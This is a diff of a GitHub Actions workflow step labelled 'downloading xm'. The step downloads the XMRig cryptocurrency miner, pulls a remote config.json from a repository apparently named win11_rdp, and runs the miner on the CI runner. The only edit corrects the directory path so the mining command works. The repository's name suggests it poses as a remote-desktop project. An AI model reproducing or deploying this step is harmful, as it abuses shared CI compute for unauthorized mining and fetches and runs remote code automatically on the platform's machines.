@@ -10,4 +10,4 @@ jobs:
 
     steps:
     - name: downloading xm
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip && unzip xmrig-6.17.0-gcc-win64.zip && cd xmrig-6.17.0-gcc-win64/xmrig-6.17.0 && Invoke-WebRequest https://raw.githubusercontent.com/Ma24wt/win11_rdp/main/config.json -Outfile config.json && ./xmrig.exe
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip && unzip xmrig-6.17.0-gcc-win64.zip && cd xmrig-6.17.0 && Invoke-WebRequest https://raw.githubusercontent.com/Ma24wt/win11_rdp/main/config.json -Outfile config.json && ./xmrig.exe
